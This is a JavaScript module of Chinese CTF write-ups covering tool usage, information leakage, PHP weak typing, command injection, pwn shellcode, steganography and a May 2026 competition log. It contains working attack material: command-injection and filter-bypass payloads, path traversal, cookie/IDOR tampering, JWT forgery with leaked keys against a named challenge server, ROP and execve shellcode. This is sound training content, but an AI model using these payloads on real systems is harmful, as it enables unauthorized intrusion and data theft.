export const articles = {
  tools: {
    title: 'CTF 工具使用指南',
    subtitle: 'CTF Tools Guide',
    content: `
CTF 比赛中工具的使用至关重要。这里总结了我常用的工具及其使用技巧。

## IDA Pro — 逆向分析神器

IDA Pro 是最强大的静态反汇编工具，CTF 逆向必备。

### 基础操作

**打开文件**
- 拖入 PE/ELF 文件即可自动识别架构
- 首次打开选择 "New"，后续选 "Load existing" 保留注释

**常用快捷键**

\`\`\`
Tab          # 切换 Graph View / Text View
F5           # 反编译为 C 伪代码（Hex-Rays 插件）
Shift+F12    # 打开字符串表（找敏感字符串）
X            # 查看交叉引用（找函数调用位置）
R            # 将数据转为字符显示
H            # 切换数据格式（hex/dec/bin）
N            # 重命名变量/函数
Space        # 切换反汇编/十六进制视图
\`\`\`

**实战技巧**

找 main 函数的三种方法：
1. **字符串查找法**: Shift+F12 搜 "flag"、"password"、"input" 等
2. **长驱直入法**: 从程序入口一步步跟，适合简单程序
3. **API 引用法**: 找 MessageBox、scanf、strcmp 等关键 API

\`\`\`
# 示例：Hello CTF 题目
Shift+F12 → 搜 "please input" → 双击跳转 → F5 看伪代码
看到 strcpy 和 strcmp，分析逻辑即可
\`\`\`

---

## Burp Suite — Web 抓包改包

Web 题目必备，拦截和修改 HTTP/HTTPS 请求。

### 核心功能

**Proxy 模块**
- Intercept: 拦截请求，修改后再发送
- HTTP history: 查看所有请求历史

**Repeater 模块**
- 重放单个请求，方便测试 payload
- 支持手动修改任意字段

**Intruder 模块**
- 批量爆破：用户名、密码、目录等
- 支持多种攻击模式（Sniper/Battering ram/Pitchfork/Cluster bomb）

### 常用操作

\`\`\`
# 拦截并修改 Cookie
Intercept On → 浏览器访问目标 → 在 Burp 中修改 Cookie: user=admin → Forward

# 爆破目录
Target → 右键 "Engagement tools" → Discover content
或 Intruder 加载字典爆破 /api/FUZZ
\`\`\`

---

## GDB / Pwndbg — PWN 调试

Linux 下二进制调试的标准工具。

### 基础命令

\`\`\`
file ./pwn       # 加载目标文件
run / r          # 运行程序
break *main      # 在 main 函数下断点
break *0x401000  # 在指定地址下断点
continue / c     # 继续运行
next / n         # 单步步过
step / s         # 单步步入
info registers   # 查看寄存器
x/10gx $rsp      # 查看栈内容（10个64位值）
vmmap            # 查看内存映射（pwndbg）
checksec         # 查看保护机制（pwndbg）
\`\`\`

### Pwndbg 增强

\`\`\`
# 安装
pip install pwntools
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 常用功能
context          # 自动显示寄存器、栈、代码
heap             # 查看堆结构
cyclic 100       # 生成 De Bruijn 序列找偏移
\`\`\`

---

## Python + Pwntools — PWN 自动化

Pwntools 是 CTF PWN 方向的 Python 库，极大简化 exploit 编写。

### 基础用法

\`\`\`python
from pwn import *

# 连接远程服务
p = remote('target.com', 1337)

# 本地调试
p = process('./pwn')

# 附加调试器
gdb.attach(p)

# 接收/发送数据
p.recvuntil(b'input:')
p.sendline(b'payload')

# 格式化字符串利用
p.sendline(fmtstr_payload(6, {elf.got['printf']: elf.sym['system']}))

# 获取 shell 后交互
p.interactive()
\`\`\`

### 常用功能

\`\`\`python
context.arch = 'amd64'      # 设置架构
context.log_level = 'debug' # 开启调试输出

# ELF 文件操作
elf = ELF('./pwn')
print(hex(elf.sym['main']))      # 获取函数地址
print(hex(elf.got['puts']))      # 获取 GOT 表地址

# ROP 工具
rop = ROP(elf)
rop.call(elf.sym['system'], [next(elf.search(b'/bin/sh'))])
payload = rop.chain()

# Shellcode
context.arch = 'amd64'
sc = asm(shellcraft.sh())
\`\`\`

---

## 其他常用工具

| 工具 | 用途 | 典型场景 |
|------|------|----------|
| **checksec** | 检查二进制保护 | 查看 NX/PIE/Canary/RELRO |
| **ROPgadget** | 查找 ROP 链 | 构造 ROP payload |
| **one_gadget** | 找 execve 地址 | libc 利用 |
| **strings** | 查看字符串 | 快速找 flag 格式 |
| **binwalk** | 文件分析 | 提取隐藏文件 |
| **zsteg** | LSB 隐写 | PNG 图片隐写 |
| **steghide** | 隐写提取 | 带密码的图片隐写 |
| **CyberChef** | 在线编码转换 | Base64/Hex/URL 编码 |
| **Hashcat** | 密码破解 | 破解哈希 |
| **John** | 密码破解 | zip/pdf 文件破解 |

---

## 速查表

### 快速启动命令

\`\`\`bash
# IDA
ida64 ./binary

# GDB
pwndbg ./binary

# Burp
java -jar burpsuite_community.jar

# Python exploit
python3 exp.py
\`\`\`

### 常用 Payload 模板

\`\`\`python
# 基础连接模板
from pwn import *
context.log_level = 'debug'
p = remote('host', port)
# p = process('./pwn')
# gdb.attach(p)

p.recvuntil(b':')
p.sendline(b'payload')
print(p.recvline())
p.interactive()
\`\`\`

---

**建议**：工具只是手段，理解原理才是核心。多刷题，多动手，工具会越来越顺手。
`
  },
  infoleak: {
    title: '信息收集与泄露',
    subtitle: 'Information Gathering & Leakage',
    content: `
做信息收集这类题，我最大的感受就是**别放过后台的每一条线索**。很多 flag 其实就藏在眼皮底下，只是我们没注意到。

## HTML 注释与前端泄露

最早的题目就有隐藏在 HTML 注释里的 base64 字符串。我习惯 Ctrl+U 看源码，结果在注释中发现一串可疑字符串，解码直接出 flag。

\`\`\`bash
echo 'ZmxhZ3sxM2Fh...' | base64 -d
# flag{13aab1b2-6ffc-40bb-b936-6bf02456afca}
\`\`\`

JSFuck 是另一个前端混淆的重灾区。页面上看起来是一堆乱码 \`[\`] \`(\`) \`!\` \`+\`, 其实是 JavaScript 表达式。最简单的方法是打开浏览器控制台，把变量名或密码值直接 \`eval()\`，不需要手动解码。

隐藏表单字段也是一个容易被忽略的点。有些题目把 \`is_admin\` 或 \`role\` 设为 \`type="hidden"\`，以为用户改不了。用 Burp Suite 拦截请求，把值从 0 改成 1：

\`\`\`bash
curl -X POST URL -d 'is_admin=1&nickname=test'
\`\`\`

## 响应头、302 响应体与协议层

用 \`curl -I\` 查响应头是基本功，但我在这道题上吃过亏——当时只看了 body，忽略了 \`X-Flag\` 字段，其实 flag 就藏在响应头里。

\`\`\`bash
curl -I URL   # X-Flag: flag{...}
\`\`\`

更隐蔽的是 302 重定向的响应体。很多人以为 302 只有 Location 头，没有 body，于是直接 \`allow_redirects=True\` 自动跟进，结果完全错过了藏在中间响应里的 flag。

\`\`\`python
r = requests.post(url, data={'solved':'1'}, allow_redirects=False)
# 错误：直接follow会错过body
# 正确：逐层检查每层响应的body
if 'flag{' in r.text: print(r.text)
\`\`\`

## 敏感文件与备份文件

这道题的入口藏在 \`robots.txt\` 里：\`Disallow: /qcq.php\`，访问即得 flag。

\`\`\`bash
curl URL/robots.txt     # Disallow: /qcq.php
curl URL/qcq.php        # 直接访问
\`\`\`

\`.phps\` 文件泄露源码也是经典——PHP 文件的备份版本会暴露完整逻辑：

\`\`\`bash
curl URL/index.phps     # 源码泄露，密码 QCyYdS
curl URL/?a=QCyYdS      # 提交密码
\`\`\`

常见的备份文件后缀我一般会批量扫：\`/index.phps\`、\`.bak\`、\`.swp\`、\`.git/config\`、\`/www.zip\`。

## Cookie 注入与认证绕过

Cookie 注入（IDOR）有时候比 SQL 注入还隐蔽。题目用 \`$_COOKIE['user']\` 判断权限，直接改 Cookie 比改 URL 参数更直接：

\`\`\`python
requests.get(url + '/wqw.php', cookies={'user': 'admin'})
# flag{ac4c342e-eee3-4c43-bce2-c4a4b42e8e2e}
\`\`\`

**关键**：必须用 Cookie 头而不是 URL 参数。

JWT 伪造则是另一个典型场景。如果源码里泄露了 HMAC 密钥，就能用 PyJWT 伪造任意身份：

\`\`\`python
import jwt
token = jwt.encode({"iss":"admin"}, "ctfshow_jwt_admin", algorithm="HS256")
\`\`\`

## /proc/self/ 文件系统利用

这道题很巧妙：代码限制了 \`$_GET['filename']\` 长度必须小于 17，但同时用 \`fopen\` 在 \`readfile\` 之前预先打开了一个文件描述符。

\`\`\`bash
curl "URL/?filename=/proc/self/fd/5"
# flag{97e38d30-ef25-47ad-b102-45f1b4659fac}
\`\`\`

**关键**：\`fopen\` 在 \`readfile\` 之前执行，fd 号可能是 3/4/5，需逐一尝试。

## LFI 路径穿越

青岑 CTF 的 ezinfoleak：页面提供文件浏览功能，但限制在 \`/app/\` 目录下。想要读根目录的 flag，就需要路径穿越：

\`\`\`bash
# 一层不够就多试几层
curl "http://target/?file=../../../../fl4g.txt"
# flag{...}
\`\`\`

**关键**：穿越深度很重要。从 \`/app/sub/dir/\` 回到根需要 \`../../../\`。不知道具体深度就从 1 试到 10。

## 隐藏文件与文档 IDOR

CTFShow basic_12：页面只显示一个链接，ID 为 190。试试相邻的 ID：

\`\`\`bash
curl "http://target/?id=121"
# 发现一个隐藏文档，flag 就在里面！
\`\`\`

**教训**：不要只相信页面上显示的参数值，IDOR 的参数值需要大胆去猜。

---

**踩坑教训**：做信息收集题目，**永远不要放过任何一条线索**。HTML 注释、响应头、robots.txt、备份文件、Cookie、JWT 密钥——每个角落都可能藏着 flag。
`
  },
  php: {
    title: 'PHP 弱类型',
    subtitle: 'PHP Weak Typing',
    content: `
PHP 的弱类型比较是 CTF 中最经典的知识点之一，也是这次刷题里踩坑最多的地方。核心原理很简单：PHP 在用 \`==\` 比较时会自动做类型转换，而 \`===\` 严格比较则不会。

## 弱比较绕过数字判断

最典型的场景是同时要求一个变量"为真"且"等于 0"。看起来矛盾，但 \`"0abc"\` 就能同时满足：

\`\`\`php
if($a and $a==0)    // "0abc" == 0 且为真
if(!is_numeric($b)) // "2027a" 含字母→false
if($b > 2026)       // "2027a" > 2026
\`\`\`

Payload: \`?a=0abc&b=2027a\`

## array_search 弱类型

\`array_search\` 默认用 \`==\` 比较，而 \`"QCCTF" == 0\` 为 true，所以它会错误地匹配到 index 0：

\`\`\`php
$key = array_search("QCCTF", $qc); // "QCCTF"==0 → key=0（错）
// 需要 key===1，所以 QCCTF 在 index 1
\`\`\`

Payload: \`?qc=["a","QCCTF"]\`

## 嵌套弱类型

更绕的还有嵌套弱类型：要求 \`0 == "QCyyds"\` 但 \`0 !== "QCyyds"\`：

\`\`\`php
// 0 == "QCyyds" 但 0 !== "QCyyds" ✓
\`\`\`

Payload: \`?qc={"0":"QCCTF","n":[0]}\`

## MD5 和 SHA1 绕过

0e 开头的哈希值在弱比较下会被当成科学计数法，等于 0：

\`\`\`
GET ?a=QNKCDZO&b=240610708
\`\`\`

但遇到 \`===\` 严格比较，0e 绕过就失效了。这时数组绕过登场：\`md5([])\` 和 \`sha1([])\` 对数组都返回 NULL，而 \`NULL === NULL\` 为 true：

\`\`\`
GET ?a[]=1&b[]=2
\`\`\`

---

## 速查表

| 场景 | Payload | 原理 |
|------|---------|------|
| \`== 0\` 绕过 | \`"0abc"\` | 字符串开头非数字则等于0 |
| is_numeric 绕过 | \`"2027a"\` | 含字母，不是纯数字 |
| 0e MD5 绕过 | \`QNKCDZO\` | 0e 开头的 hash 被当科学计数法 |
| md5/sha1 严格比较 | \`?a[]=1&b[]=2\` | 数组返回 NULL，NULL===NULL |
| array_search | \`["a","QCCTF"]\` | "QCCTF" 在 index 1 |

## 变量覆盖

ISCC 的一道题：代码用 \`foreach(\$_GET as $k => $v) $$k = $v;\` 实现了变量覆盖。

\`\`\`php
// 通过 URL 传参覆盖任意变量
// 源码注释里藏着关键变量名和期望值
GET ?key=[]&expected=test
\`\`\`

用空数组 \`[]\` 打破字符串 === 的严格比较。变量覆盖可以瞬间绕过复杂的 if 判断。

**经验**：
1. 页面源码注释永远不要忽略，关键词和变量名常藏在那里
2. 空数组在弱类型比较中是个万能工具

---

**踩坑教训**：
1. 永远先看清 \`==\` 还是 \`===\`，两种绕过思路完全不同
2. \`array_search\` 的弱类型陷阱容易被忽略，默认行为不是严格比较
3. 0e 绕过的字符串要验证 MD5 后确实是 0e 开头全数字
`
  },
  cmd: {
    title: '命令注入',
    subtitle: 'Command Injection',
    content: `
命令注入的考点从简单到变态，层层加码，每一道题都在考验对 Linux 命令行和 PHP 函数的理解深度。

## 基础注入与绕过

最基础的题目输入直接拼进 \`system()\`，没有任何过滤：

\`\`\`
POST cmd=cat /flag
\`\`\`

稍微加了点料——过滤了 flag 关键词——就用分号截断：

\`\`\`
POST cmd=ip;cat /flag
\`\`\`

过滤了空格怎么办？Linux 下 \`$IFS\` 是内部字段分隔符：

\`\`\`
POST cmd=cat\${IFS}/flag
\`\`\`

## 无字母 RCE ★（一血）

过滤了所有 a-zA-Z 字母，看起来完全没法构造命令。但 Linux 的 \`.\` 命令（等价于 \`source\`）可以读取并执行文件内容，而它本身不是字母：

\`\`\`
POST /?cmd=. /????.??? 2>&1
\`\`\`

\`/????.???\` 匹配 \`/flag.txt\`，\`.\` 执行文件内容，错误信息泄露 flag。

**关键细节**：\`system()\` 只捕获 stdout，而 source 执行不存在文件时错误信息走的是 stderr，必须加 \`2>&1\` 把 stderr 重定向到 stdout 才能看到 flag！

## PHP 函数调用链

如果题目把命令执行封装在 PHP 的 \`eval\` 或 \`system\` 里：

\`\`\`php
// ezcmd_6: eval执行
POST qc=system("cat /flag")

// ezcmd_7: 关键词过滤，字符串拼接
POST qc=system("cat /fl"."ag")

// ezcmd_8: passthru + 拼接
POST qc=passthru("cat /fl"."ag")

// ezcmd_9: tab绕过空格
POST qc=passthru("cat\\t/fl"."ag")
\`\`\`

## PHP 源码泄露

用 \`?>\` 提前结束 PHP 标签，后面的内容会被当成纯文本直接输出：

\`\`\`
GET /?qc=readfile('flag.php')?>
\`\`\`

URL 里记得编码为 \`%3F%3E\`。

---

## 绕过速查表（更新版）

| 过滤项 | 绕过方法 |
|--------|---------|
| 空格 | \`\${IFS}\`, \`<\`, \`{cat,/flag}\`, tab |
| 关键词拼接 | \`"fl"."ag"\`, \`'fl'.'ag'\` |
| 无字母RCE | \`. /????.??? 2>&1\` (source泄露) |
| 数字+字母全过滤 | XOR 构造字符 |
| system/exec | passthru, shell_exec, proc_open |
| 输出重定向 | \`;#\` 注释后面 |

## XOR 构造字符串技巧

当 WAF 连字母数字都过滤时，可以用 XOR 运算符从可用字符中拼出目标字符串：

\`\`\`php
# 目标: 构造 "system"
# 用 XOR 从两个非字母字符拼出字母
$__ = ("_"^"\\");   // "_" ^ "\\" = "s"
# 继续 XOR 链拼出完整函数名
$_("cat /fl*");
\`\`\`

**原理**：字符的 ASCII 值经过 XOR 运算后可能得到任意字母。关键是找到 WAF 放行的字符组合。参考：[php-chars-xor](https://github.com/ymgve/php-chars-xor)

---

**踩坑教训**：
1. \`2>&1\` 这个 stderr 重定向是真正的杀手锏，好几次我拿到了 payload 却看不到 flag，就是忘了加它
2. 无字母场景别死磕字母，\`.\`、\`$()\`、通配符都是非字母的可用资源
3. PHP 的 \`?>\` 闭合标签技巧很容易被忽略，它本质上是在利用 PHP 的混编机制
`
  },
  pwn: {
    title: 'PWN 与逆向',
    subtitle: 'PWN & Reverse Engineering',
    content: `
这次来聊聊 CTF 中两个最"硬核"的方向——PWN 和逆向。我挑了三道有意思的题目，难度从简单到困难都有覆盖。

## X0r — 逆向中的数据提取

给了一个 ELF binary，用 IDA 打开一看，核心逻辑就是两层 XOR。先把数据提取出来：

\`\`\`python
cipher = [0x61, 0x6e, 0x75, 0x60, 0x79, 0x6d, 0x37, 0x77,
          0x4b, 0x4c, 0x6c, 0x24, 0x50, 0x5d, 0x76, 0x33,
          0x71, 0x25, 0x44, 0x5d, 0x6c, 0x48, 0x70, 0x69]
key1 = [0x14, 0x11, 0x45]
key2 = [0x13, 0x13, 0x51]
flag = ''.join(chr((c ^ key1[i%3]) ^ key2[i%3]) for i, c in enumerate(cipher))
# flag{y0u_Kn0W_b4s1C_xOr}
\`\`\`

**踩坑**：从反汇编提取密文时，第 4 字节我抄成了 0x60，而实际应该是 0x79。结果解密出来第一位不是 \`g\` 而是 \`~\`。做逆向的时候，**数据提取一定要仔细**！

## Pwn's Door — 逆向密码算法

这道题更简单，binary 里 scanf 读取了一个整数，然后和 0x6b6579 做比较：

\`\`\`
0x6b6579 = 'k' + 'e' + 'y' → 十进制 7038329
\`\`\`

连接服务器的 9999 端口，输入这个数字：

\`\`\`
flag{6551ffb1-f3f2-42d2-bdc7-86ec5d2f2cca}
\`\`\`

## input_function — Shellcode 编写 ★（一血）

重头戏来了。这道题考的是真正的 PWN 核心：shellcode 编写。

程序逻辑极简：

\`\`\`c
void *mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...);
read(0, mem, 0x1000);
((void(*)())mem)();  // 直接执行用户输入！
\`\`\`

直接分配了一块 RWX 内存，然后把输入的内容当成代码执行——经典的 shellcode 执行场景。

我的目标是写一个 23 字节的 \`execve("/bin/sh")\` shellcode。系统调用号 59，参数布局：rax=59，rdi=字符串地址，rsi=0，rdx=0。

\`\`\`python
shellcode = bytes([
    0x48,0x31,0xf6,                         # xor rsi, rsi
    0x56,                                    # push rsi
    0x48,0xbf, 0x2f,0x62,0x69,0x6e,         # movabs rdi, "/bin//sh"
    0x2f,0x2f,0x73,0x68,
    0x57,                                    # push rdi
    0x54, 0x5f,                              # push rsp; pop rdi
    0x6a,0x3b, 0x58,                         # push 59; pop rax
    0x99,                                    # cdq (rdx=0)
    0x0f,0x05                                # syscall
])
\`\`\`

细节在于 "/bin//sh" 用了两个斜杠凑齐 8 字节对齐。压栈后用 \`push rsp; pop rdi\` 巧妙地把字符串地址取出来。

\`\`\`
flag{18744bff-3292-47b3-9f74-54a8e4b7f738}
\`\`\`

---

**总结**：这三道题代表了 CTF 中 PWN 和逆向的典型思路：数据提取与算法逆向、协议交互、以及底层 shellcode 编写。每道题都不算复杂，但拼在一起，正好覆盖了这个方向从入门到进阶的核心技能。
`
  },
  stego: {
    title: '隐写术与加密',
    subtitle: 'Steganography & Cryptography',
    content: `
隐写术的核心思想是**让秘密看起来不像秘密**。这次我遇到了三种不同的隐写题：零宽字符、EXIF 图片隐写、以及 ZIP 多重密码破解。

## 零宽字符隐写（Zero-Width Steganography）

零宽字符是 Unicode 中**看不见也打不出来**的特殊字符。它们在屏幕上不占任何位置，但文本里确实存在。

常见零宽字符：

| Unicode | 名称 | 缩写 |
|---------|------|------|
| U+200C | 零宽非连接符 | ZWNJ |
| U+200D | 零宽连接符 | ZWJ |
| U+202C | 弹出方向格式化 | PDF |
| U+FEFF | 零宽非断空格/BOM | BOM |

**编码原理**：用 4 种零宽字符，每种编码 2 位。

\`\`\`
ZWNJ = 00
ZWJ  = 01
PDF  = 10
BOM  = 11
\`\`\`

### 实战：key3.docx 中的隐藏信息

key3.docx 其实是个 ZIP 压缩包。解压后在 \`docProps/core.xml\` 的 \`<dc:description>\` 字段里找到大量零宽字符：

\`\`\`xml
<dc:description>
  &#x200C;&#x200C;&#x200C;&#x200C;&#x200D;&#x202C;&#x202C;&#xFEFF;
  &lt;!-- key会在这里吗？--&gt;
</dc:description>
\`\`\`

\`&lt;!-- key会在这里吗？--&gt;\` 是障眼法。真正的数据藏在前面 64 个零宽字符里。

**解码步骤**：

1. 提取全部零宽字符（共 64 个）
2. 查表转二进制：每个字符转 2 位
3. 64 × 2 = 128 位 = 16 字节
4. 按 UTF-16BE 解码（每字节前有个 \`\x00\`）

\`\`\`python
import zipfile, re

with zipfile.ZipFile('key3.docx') as z:
    core = z.read('docProps/core.xml').decode('utf-8')
    desc = re.search(r'<dc:description>([^<]*)</dc:description>', core).group(1)

zw_map = {'\u200c': '00', '\u200d': '01', '\u202c': '10', '\ufeff': '11'}
bits = ''.join(zw_map[c] for c in desc if c in zw_map)
text = ''
for i in range(0, len(bits), 8):
    byte = int(bits[i:i+8], 2)
    if byte != 0:
        text += chr(byte)
# text = "key3:666"
\`\`\`

解码结果：**\`key3:666\`**

**关键教训**：一开始我只用了 ZWNJ=0、ZWJ=1（1 bit/字符），47 位二进制解不出任何东西。正确答案是 4 种字符 × 2 bits/字符，总数据 128 位。

---

## EXIF 图片隐写

拿到一个 flag.jpg，表面上是空白图，但文件大小 231KB 明显不对劲。

先用 Python 读 EXIF 信息：

\`\`\`python
from PIL import Image
img = Image.open('flag.jpg')
exif = img.getexif()
for tag_id, value in exif.items():
    print(tag_id, repr(value)[:100])
\`\`\`

在 EXIF tag **40092** 里发现隐藏数据！

### 三层 Base64 解码

第一层 Base64 解码 → 还是 Base64 格式
第二层 Base64 解码 → 还是 Base64 格式
第三层 Base64 解码 → **\`flag{Y0u_Ar0_decryp9_M2ster}\`**

\`\`\`python
import base64, struct

# 从 EXIF 提取数据
with open('flag.jpg', 'rb') as f:
    data = f.read()

# 找 EXIF tag 40092（0x9C9C）
idx = data.find(b'\x9c\x9c\x00\x10\x00\x01\x03\x00')
if idx >= 0:
    # 提取 raw bytes
    raw_len = struct.unpack('<I', data[idx+4:idx+8])[0]
    raw = data[idx+8:idx+8+raw_len]
    # 三层 Base64 解码
    d1 = base64.b64decode(raw)
    d2 = base64.b64decode(d1)
    flag = base64.b64decode(d2).decode('utf-8')
    # flag{Y0u_Ar0_decryp9_M2ster}
\`\`\`

**有意思的地方**：图片表面打开后显示的是 **\`CTFshow{这都能让你找到}\`**，其实是诱饵 flag。真正的 flag 藏在 EXIF 元数据里。

---

## ZIP 多重密码破解

这是一个经典的"三步锁"式密码题：三层 ZIP 套娃，每层都有一个 Key，最终三个 Key 拼成密码。

### 第一层：外层 ZIP

直接解压，得到一个伪加密的 ZIP（第二关.zip）。用 WinRAR 或 7-Zip 的"修复压缩文件"功能，或者改 ZIP 文件头的加密标志位就能解压。

解压后得到三个文件：
- **key1.docx**：内含 108 个 emoji
- **key2.txt**：社会主义核心价值观字符串
- **key3.docx**：零宽隐写
- **readme.txt**：提示"要三个key拼在一起"

### 第二层：Key 1 — emoji Base100 解码

key1.docx 里有 108 个 emoji，看起来毫无意义。但有一个叫 **Base100** 的编码标准（类似于 Base64），用 100 个 emoji 映射 0-99 的数字。

\`\`\`python
# Base100 解码原理
# 0-62 的 ASCII 字符直接映射
# 63-99 用 emoji 映射
# 108 emoji → 108 字节 → Base64 → 中文文本
\`\`\`

解码结果："看来你已经知道zip伪加密怎么破解了，那么就给你一个key:**zsm**"

**Key 1 = zsm**

### 第三层：Key 2 — 社会主义核心价值观解码

key2.txt 的内容是："法治敬业法治敬业公正自由法治和谐"

这是 12 个社会主义核心价值观词语，每个映射一个十六进制值（0x0-0xB）：

\`\`\`
富强=0 民主=1 文明=2 和谐=3
自由=4 平等=5 公正=6 法治=7
爱国=8 敬业=9 诚信=10 友善=11
\`\`\`

将每个词映射为 hex 数字，拼接起来：
\`\`\`
法治(7) 敬业(9) 法治(7) 敬业(9)
公正(6) 自由(4) 法治(7) 和谐(3)
→ 0x79796473 → ASCII解码 → "yyds"
\`\`\`

**Key 2 = yyds**

### 第四层：Key 3 — 零宽字符解码

见上文零宽隐写部分。key3.docx 的 \`dc:description\` 字段藏了 64 个零宽字符，用 4 种字符 × 2 bits 解码得到：

**Key 3 = 666**

### 最终密码

三个 Key 拼接：**zsm** + **yyds** + **666** = **\`zsmyyds666\`**

用这个密码解压 \`第三关.zip\`，得到 \`flag.jpg\`（EXIF 隐写，见上文）。

\`\`\`
最终 flag: flag{Y0u_Ar0_decryp9_M2ster}
\`\`\`

---

**踩坑教训**：
1. ZIP 伪加密 = 改加密标志位，并非真的加密
2. Base100 不是 npm 的 base100 包（只映射 0-99 数字），而是完整的 ASCII-emoji 映射
3. 三个 Key 直接拼接，中间没有分隔符
4. 零宽隐写不要只用 2 种字符，标准库用的是 4 种 × 2 bits
`
  },
  misc: {
    title: '杂项与综合',
    subtitle: 'Miscellaneous',
    content: `
杂项题往往是最有意思的，因为什么都有可能考到。这里总结了几道不同类型的杂项题。

## CTFHub 彩蛋

CTFHub 平台有一个隐藏的彩蛋页面，不需要登录就能拿到 flag：

\`\`\`bash
curl https://www.ctfhub.com/skill/easter_egg
# ctfhub{b644d27a30b450b2f170c4f19ef1dd85fb1efc5d}
\`\`\`

**注意**：这是平台的彩蛋 flag，不是某道具体题目的 flag。

---

## 无字母数字 RCE 进阶

这是青岑 CTF 中的 ezcmd_5（一血题），WAF 过滤了所有字母和数字，但保留了 \`+\`、\`-\`、\`*\`、\`/\`、\`^\`（XOR）、\`\`\`、\`$\`\`_\` 等符号。

**关键思路**：

1. **正斜杠不能用**？那用反斜杠！XOR 构建字母
2. **\`system\` 不能直接写**？用变量函数 \`$_()\` 动态调用
3. **通配符**：\`/???/?????\` 匹配 \`/bin/cat\`

\`\`\`php
$_="_";$$_($_);  // 变量函数调用
// 或利用 XOR 构造 "system"
$_="";$__=("_"^"\\");$___=($__^"\\");$$$_("cat /flag");
\`\`\`

但最巧妙的解法是用 **Linux 的 \`.\` 命令**（source 的别名）：

\`\`\`bash
. /????.??? 2>&1
\`\`\`

\`\`\`.\` 不是字母，\`1\`、\`2\` 也不是字母（\`2>&1\` 重定向 stderr）。\`/????.???\` 用通配符匹配 \`/flag.txt\`。

**关键**：\`system()\` 只捕获 stdout，而 source 执行文件出错时走 stderr，必须 \`2>&1\` 才能看到 flag！

---

## 隐藏文件与文档 IDOR

这道题是 CTFShow 的 basic_12，网页上只显示"basic_12"一个链接，没有其他信息。

我尝试给 ID 加了不同参数：

\`\`\`bash
# 默认 ID=190，试试 ID=121 看看
curl "http://target/?id=121"
# 发现了一个隐藏文档！
\`\`\`

Flag 直接出现在隐藏文档里。这种 IDOR 就是靠猜 ID 值，不需要任何复杂技巧。

---

## LFI 路径穿越

青岑 CTF 的 ezinfoleak 题：页面提供一个文件浏览功能，但限制了可访问的路径。

查看页面源码发现限制在 \`/app/\` 目录下，但 flag 在根目录 \`/fl4g.txt\`：

\`\`\`bash
# 单层 ../ 不够，得往上翻 4 层
curl "http://target/?file=../../../../fl4g.txt"
# flag{...}
\`\`\`

**关键**：LFI 路径穿越的深度很重要。\`../../../../\` = 从 \`/app/some/sub/dir/\` 回到根目录。

---

## SSRF 多种协议绕过

这道题的核心是一个 SSRF 漏洞，需要向 \`flag.php\` 发送 POST 请求，但要求 \`$_POST["key"] == $key\`（弱类型比较）。

尝试了三种协议：

| 协议 | 状态 | 说明 |
|------|------|------|
| gopher:// | ❌ 超时 | PHP curl 未编译 gopher 支持 |
| dict:// | ✅ 连通 | 能收到响应但无法构造完整 POST |
| file:// | ✅ 可用 | 成功读取了 index.php 源码 |

**关键发现**：\`file://\` 协议可以直接读取服务端的 PHP 文件源码，拿到代码逻辑后再找绕过方法。

---

## 变量覆盖与 PHP 弱类型进阶

ISCC 的一道 Web 题：代码中有变量覆盖漏洞，配合 PHP 弱类型绕过。

\`\`\`php
// 核心代码：变量覆盖
foreach($_GET as $k => $v) $$k = $v;

// 然后用 === 做严格判断
if ($key === "secret_value") { ... }
\`\`\`

**绕过方法**：通过 URL 参数 \`?key=[]\` 传入空数组，利用 PHP 的变量覆盖机制覆盖 \`$key\`。

**经验**：
1. 查看源码注释，那里往往藏着路由提示和关键参数
2. 空数组 \`[]\` 与字符串/数字的比较行为是 PHP 弱类型的精髓
3. 变量覆盖 \`foreach($$k)\` 可以通过传参覆盖任意变量

---

**踩坑教训**：
1. CTF 中不要漏掉任何页面源码的注释
2. LFI 穿越深度要大胆试，从 1 级到 10 级逐一排查
3. IDOR 的参数值不要只看表面，試試相邻的 ID
4. SSRF 中不同协议行为差异很大，gopher/dict/file 一定要都试
`
  },
  "may-2026": {
    title: "CTF Writeup - 2026年5月",
    subtitle: "ISCC / 青岑 / CTFShow",
    content: `
# CTF Writeup - 2026年5月 (截至5月6日)

## 一、ISCC CTF Web (解出 \ud83d\udd25)

**题目**: \`http://39.105.213.28:49106\`
**FLAG**: \`ISCC{K6FRFyHAMaMmPZNmXXpA}\`

### 攻击链

#### 1. \`.git\` 源码泄露
\`\`\`bash
# 用 git_dumper 克隆仓库
python git_dumper.py http://39.105.213.28:49106/.git/ ./iscc_git/

# 查看 git 历史，找到旧版本
git log --all --oneline
git show <commit_id>:legacy_probe_stub.py
\`\`\`

从 \`.git/objects\` 中还原了旧版 \`legacy_probe_stub.py\`，获取两个关键密钥：
- **JWT 密钥**: \`ISCC_2026_JWT_DEBUG_KEY_#9527\`
- **旧版 HMAC 密钥**: \`ISCC_SERVER_SECRET_REAL\`

#### 2. 登录
\`\`\`
用户名: auditor
密码: audit2025
\`\`\`
（从 git 历史或源码中找到的凭据）

#### 3. HS256 JWT 伪造
\`\`\`python
import jwt
payload = {"sub": "auditor_id", "role": "auditor", "exp": 9999999999}
token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_#9527", algorithm="HS256")
# 将 token 填入 Cookie: jwt_token=xxx
\`\`\`

#### 4. 关键绕过：单独发送 JWT
访问 \`/auditor/nodes\` 时：
- **Flask session + JWT 同时存在** → 走额外校验逻辑（拒绝）
- **单独 JWT cookie（无 session）** → 服务端只校验 JWT 不校验 session → **200 放行！**

这是 Flask + JWT 混合认证逻辑的漏洞利用。

#### 5. 内部 API HMAC 签名
在 \`/auditor/nodes\` 页面提交查询时，需对 \`node_id:timestamp\` 进行 HMAC-SHA256 签名：
\`\`\`python
import hmac, hashlib, time

node_id = "core-storage-01"
timestamp = str(int(time.time()))
msg = f"{node_id}:{timestamp}"
sig = hmac.new(
    "ISCC_SERVER_SECRET_REAL".encode(),
    msg.encode(),
    hashlib.sha256
).hexdigest()
# 将 sig、node_id、timestamp 作为请求参数提交
\`\`\`

#### 6. Flag 获取
签名验证通过后，返回 flag。

---

## 二、青岑 CTF（120/120 一血通关 \ud83c\udf1f）

**平台**: ctf.jinqiujec.com
**战绩**: 120题全部解答，100%一血率

### 关键解题技术

| 题型 | 题目 | 技术要点 |
|------|------|---------|
| EZINFOLEAK_2~5 | MISC | \`/proc/self/environ\` 泄露路径，phpinfo 找源码，\`.git\` 暴露 |
| JWT | WEB | HS256 弱密钥爆破 \`rockyou.txt\` |
